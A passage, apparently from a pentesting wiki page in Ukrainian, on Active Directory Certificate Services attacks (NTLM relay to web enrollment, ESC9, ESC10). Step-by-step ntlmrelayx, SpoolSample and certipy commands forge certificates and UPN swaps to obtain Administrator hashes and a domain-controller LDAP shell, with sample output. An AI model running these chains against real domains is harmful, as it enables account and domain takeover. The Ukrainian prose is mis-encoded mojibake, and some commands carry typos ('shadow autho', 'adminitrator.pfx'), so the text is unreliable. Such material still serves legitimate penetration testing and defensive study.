relay**. –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∞—Ç–∞–∫ NTLM relay –¥–ª—è HTTPS-—Å–µ—Ä–≤—ñ—Å—ñ–≤ –º–æ–∂–ª–∏–≤–∏–π –ª–∏—à–µ —Ç–æ–¥—ñ, –∫–æ–ª–∏ HTTPS –ø–æ—î–¥–Ω—É—î—Ç—å—Å—è –∑ –ø—Ä–∏–≤'—è–∑–∫–æ—é –∫–∞–Ω–∞–ª—É. –ù–∞ –∂–∞–ª—å, AD CS –Ω–µ –∞–∫—Ç–∏–≤—É—î –†–æ–∑—à–∏—Ä–µ–Ω–∏–π –∑–∞—Ö–∏—Å—Ç –¥–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–∞ IIS, —â–æ —î –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–º –¥–ª—è –ø—Ä–∏–≤'—è–∑–∫–∏ –∫–∞–Ω–∞–ª—É.

–ó–≤–∏—á–∞–π–Ω–æ—é **–ø—Ä–æ–±–ª–µ–º–æ—é** –∞—Ç–∞–∫ NTLM relay —î **–∫–æ—Ä–æ—Ç–∫–∞ —Ç—Ä–∏–≤–∞–ª—ñ—Å—Ç—å —Å–µ—Å—ñ–π NTLM** —Ç–∞ –Ω–µ–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ —Å–µ—Ä–≤—ñ—Å–∞–º–∏, —è–∫—ñ **–≤–∏–º–∞–≥–∞—é—Ç—å –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è NTLM**.

–ü—Ä–æ—Ç–µ, —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ–ª–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ NTLM relay –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–µ—Ä–º—ñ–Ω –¥—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤–∏–∑–Ω–∞—á–∞—î —Ç—Ä–∏–≤–∞–ª—ñ—Å—Ç—å —Å–µ—Å—ñ—ó, –∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑ —Å–µ—Ä–≤—ñ—Å–∞–º–∏, —è–∫—ñ **–≤–∏–º–∞–≥–∞—é—Ç—å –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è NTLM**. –î–ª—è —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π —â–æ–¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤–∫—Ä–∞–¥–µ–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –∑–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

–©–µ –æ–¥–Ω–∏–º –æ–±–º–µ–∂–µ–Ω–Ω—è–º –∞—Ç–∞–∫ NTLM relay —î —Ç–µ, —â–æ **–º–∞—à–∏–Ω–∞, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º, –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –∂–µ—Ä—Ç–≤–∏**. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∞–±–æ —á–µ–∫–∞—Ç–∏, –∞–±–æ –Ω–∞–º–∞–≥–∞—Ç–∏—Å—è **–ø—Ä–∏–º—É—Å–∏—Ç–∏** —Ü—é –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è**

[**Certify**](https://github.com/GhostPack/Certify)‚Äôs `cas` –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—î **–≤–∫–ª—é—á–µ–Ω—ñ HTTP AD CS –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

–í–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `msPKI-Enrollment-Servers` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–∏–º–∏ —Ü–µ–Ω—Ç—Ä–∞–º–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (CAs) –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ —Å–ª—É–∂–±–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ (CES). –¶—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –º–æ–∂–Ω–∞ —Ä–æ–∑—ñ–±—Ä–∞—Ç–∏ —Ç–∞ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∑ Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∑ [Certipy](https://github.com/ly4k/Certipy)

–ó–∞–ø–∏—Ç –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è Certipy –Ω–∞ –æ—Å–Ω–æ–≤—ñ —à–∞–±–ª–æ–Ω—É `Machine` –∞–±–æ `User`, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —á–∏ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —â–æ –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è, –Ω–∞ `$`. –í–∫–∞–∑–∞—Ç–∏ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π —à–∞–±–ª–æ–Ω –º–æ–∂–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-template`.

–¢–µ—Ö–Ω—ñ–∫—É, —Ç–∞–∫—É —è–∫ [PetitPotam](https://github.com/ly4k/PetitPotam), –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –ø—Ä–∏–º—É—Å—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ü—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞–º–∏ –¥–æ–º–µ–Ω—É –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∫–∞–∑–∞—Ç–∏ `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–ù–æ–≤–∏–π –∑–Ω–∞—á–µ–Ω–Ω—è **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) –¥–ª—è **`msPKI-Enrollment-Flag`**, –≤—ñ–¥–æ–º–∏–π —è–∫ ESC9, –∑–∞–ø–æ–±—ñ–≥–∞—î –≤–±—É–¥–æ–≤—É–≤–∞–Ω–Ω—é **–Ω–æ–≤–æ–≥–æ `szOID_NTDS_CA_SECURITY_EXT` –±–µ–∑–ø–µ–∫–æ–≤–æ–≥–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è** –≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç. –¶–µ–π –ø—Ä–∞–ø–æ—Ä–µ—Ü—å —Å—Ç–∞—î –∞–∫—Ç—É–∞–ª—å–Ω–∏–º, –∫–æ–ª–∏ `StrongCertificateBindingEnforcement` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `1` (–∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º), —â–æ –∫–æ–Ω—Ç—Ä–∞—Å—Ç—É—î –∑ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º `2`. –ô–æ–≥–æ –∑–Ω–∞—á—É—â—ñ—Å—Ç—å –∑—Ä–æ—Å—Ç–∞—î –≤ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –¥–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ —Å–ª–∞–±—à–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –¥–ª—è Kerberos –∞–±–æ Schannel (—è–∫ —É ESC10), –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å ESC9 –Ω–µ –∑–º—ñ–Ω—é—î –≤–∏–º–æ–≥–∏.

–£–º–æ–≤–∏, –∑–∞ —è–∫–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–∞–ø–æ—Ä—Ü—è —Å—Ç–∞—î –∑–Ω–∞—á—É—â–∏–º, –≤–∫–ª—é—á–∞—é—Ç—å:

* `StrongCertificateBindingEnforcement` –Ω–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ –Ω–∞ `2` (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `1`), –∞–±–æ `CertificateMappingMethods` –≤–∫–ª—é—á–∞—î –ø—Ä–∞–ø–æ—Ä–µ—Ü—å `UPN`.
* –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –ø–æ–∑–Ω–∞—á–µ–Ω–∏–π –ø—Ä–∞–ø–æ—Ä—Ü–µ–º `CT_FLAG_NO_SECURITY_EXTENSION` —É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ `msPKI-Enrollment-Flag`.
* –ë—É–¥—å-—è–∫–∏–π EKU –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç–∞ –≤–∫–∞–∑—É—î—Ç—å—Å—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º.
* –î–æ—Å—Ç—É–ø–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ `GenericWrite` –Ω–∞–¥ –±—É–¥—å-—è–∫–∏–º –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –¥–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó —ñ–Ω—à–æ–≥–æ.

### –°—Ü–µ–Ω–∞—Ä—ñ–π –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ü—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ `John@corp.local` –º–∞—î –¥–æ–∑–≤–æ–ª–∏ `GenericWrite` –Ω–∞–¥ `Jane@corp.local`, –∑ –º–µ—Ç–æ—é –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó `Administrator@corp.local`. –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ `ESC9`, –≤ —è–∫–∏–π `Jane@corp.local` –¥–æ–∑–≤–æ–ª–µ–Ω–æ —Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∑ –ø—Ä–∞–ø–æ—Ä—Ü–µ–º `CT_FLAG_NO_SECURITY_EXTENSION` —É —Å–≤–æ—î–º—É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ `msPKI-Enrollment-Flag`.

–°–ø–æ—á–∞—Ç–∫—É —Ö–µ—à `Jane` –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Shadow Credentials, –∑–∞–≤–¥—è–∫–∏ `GenericWrite` –î–∂–æ–Ω–∞:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
–ü–æ—Ç—ñ–º `userPrincipalName` `Jane` –∑–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ `Administrator`, –Ω–∞–≤–º–∏—Å–Ω–æ –ø—Ä–æ–ø—É—Å–∫–∞—é—á–∏ —á–∞—Å—Ç–∏–Ω—É –¥–æ–º–µ–Ω—É `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
–¶—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –Ω–µ –ø–æ—Ä—É—à—É—î –æ–±–º–µ–∂–µ–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ `Administrator@corp.local` –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤—ñ–¥–º—ñ–Ω–Ω–∏–º —è–∫ `userPrincipalName` `Administrator`.

–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è —à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ `ESC9`, –ø–æ–∑–Ω–∞—á–µ–Ω–∏–π —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π, –≤—ñ–¥ —ñ–º–µ–Ω—ñ `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
–ó–∞–∑–Ω–∞—á–µ–Ω–æ, —â–æ `userPrincipalName` —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î `Administrator`, –±–µ–∑ –±—É–¥—å-—è–∫–æ–≥–æ ‚Äúobject SID‚Äù.

`userPrincipalName` `Jane` –ø–æ—Ç—ñ–º –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ —ó—ó –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
–°–ø—Ä–æ–±–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑ –≤–∏–¥–∞–Ω–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º —Ç–µ–ø–µ—Ä –¥–∞—î NT —Ö–µ—à `Administrator@corp.local`. –ö–æ–º–∞–Ω–¥–∞ –ø–æ–≤–∏–Ω–Ω–∞ –≤–∫–ª—é—á–∞—Ç–∏ `-domain <domain>` —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—É –≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

–î–≤–∞ –∑–Ω–∞—á–µ–Ω–Ω—è –∫–ª—é—á–∞ —Ä–µ—î—Å—Ç—Ä—É –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä—ñ –¥–æ–º–µ–Ω—É –≤—ñ–¥–Ω–æ—Å—è—Ç—å—Å—è –¥–æ ESC10:

* –ó–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è `CertificateMappingMethods` –ø—ñ–¥ `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` –¥–æ—Ä—ñ–≤–Ω—é—î `0x18` (`0x8 | 0x10`), —Ä–∞–Ω—ñ—à–µ –±—É–ª–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `0x1F`.
* –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è `StrongCertificateBindingEnforcement` –ø—ñ–¥ `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` –¥–æ—Ä—ñ–≤–Ω—é—î `1`, —Ä–∞–Ω—ñ—à–µ `0`.

**Case 1**

–ö–æ–ª–∏ `StrongCertificateBindingEnforcement` –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ —è–∫ `0`.

**Case 2**

–Ø–∫—â–æ `CertificateMappingMethods` –≤–∫–ª—é—á–∞—î –±—ñ—Ç `UPN` (`0x4`).

### Abuse Case 1

–ü—Ä–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ `StrongCertificateBindingEnforcement` —è–∫ `0`, –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å A –∑ –ø—Ä–∞–≤–∞–º–∏ `GenericWrite` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó –±—É–¥—å-—è–∫–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É B.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –º–∞—é—á–∏ –ø—Ä–∞–≤–∞ `GenericWrite` –Ω–∞ `Jane@corp.local`, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ `Administrator@corp.local`. –ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –ø–æ–≤—Ç–æ—Ä—é—î ESC9, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞.

–°–ø–æ—á–∞—Ç–∫—É —Ö–µ—à `Jane` –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Shadow Credentials, –µ–∫—Å–ø–ª—É–∞—Ç—É—é—á–∏ `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
–í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ, `Jane`'s `userPrincipalName` –∑–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ `Administrator`, –Ω–∞–≤–º–∏—Å–Ω–æ –ø—Ä–æ–ø—É—Å–∫–∞—é—á–∏ —á–∞—Å—Ç–∏–Ω—É `@corp.local`, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø–æ—Ä—É—à–µ–Ω–Ω—è –æ–±–º–µ–∂–µ–Ω–Ω—è.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
–ù–∞—Å—Ç—É–ø–Ω–∏–º –∫—Ä–æ–∫–æ–º –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∫–ª—ñ—î–Ω—Ç–∞, –≤—ñ–¥ —ñ–º–µ–Ω—ñ `Jane`, –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º —à–∞–±–ª–æ–Ω—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` –ø–æ—Ç—ñ–º –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ —Å–≤–æ–≥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑ –æ—Ç—Ä–∏–º–∞–Ω–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º –¥–∞—Å—Ç—å NT —Ö–µ—à `Administrator@corp.local`, —â–æ –≤–∏–º–∞–≥–∞—î –≤–∫–∞–∑—ñ–≤–∫–∏ –¥–æ–º–µ–Ω—É –≤ –∫–æ–º–∞–Ω–¥—ñ —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –¥–µ—Ç–∞–ª–µ–π –¥–æ–º–µ–Ω—É –≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –≤–∏–ø–∞–¥–∫–æ–º 2

–ó `CertificateMappingMethods`, —â–æ –º—ñ—Å—Ç–∏—Ç—å –±—ñ—Ç–æ–≤–∏–π –ø—Ä–∞–ø–æ—Ä–µ—Ü—å `UPN` (`0x4`), –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å A –∑ –ø—Ä–∞–≤–∞–º–∏ `GenericWrite` –º–æ–∂–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å B, —è–∫–∏–π –Ω–µ –º–∞—î –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ `userPrincipalName`, –≤–∫–ª—é—á–∞—é—á–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –º–∞—à–∏–Ω —ñ –≤–±—É–¥–æ–≤–∞–Ω–æ–≥–æ –¥–æ–º–µ–Ω–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ `Administrator`.

–¢—É—Ç –º–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó `DC$@corp.local`, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ö–µ—à—É `Jane` —á–µ—Ä–µ–∑ Shadow Credentials, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` —Ç–µ–ø–µ—Ä –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
–°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è —è–∫ `Jane`, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —à–∞–±–ª–æ–Ω –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ —Å–≤–æ–≥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—É –ø—ñ—Å–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
–©–æ–± –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ Schannel, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –æ–ø—Ü—ñ—è Certipy `-ldap-shell`, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —É—Å–ø—ñ—à–Ω—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —è–∫ `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
–ß–µ—Ä–µ–∑ LDAP shell –∫–æ–º–∞–Ω–¥–∏, —Ç–∞–∫—ñ —è–∫ `set_rbcd`, –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∞—Ç–∞–∫–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ—Å—É—Ä—Å—ñ–≤ –∑ –æ–±–º–µ–∂–µ–Ω–æ—é –¥–µ–ª–µ–≥–∞—Ü—ñ—î—é (RBCD), —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –¥–æ–º–µ–Ω—É.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
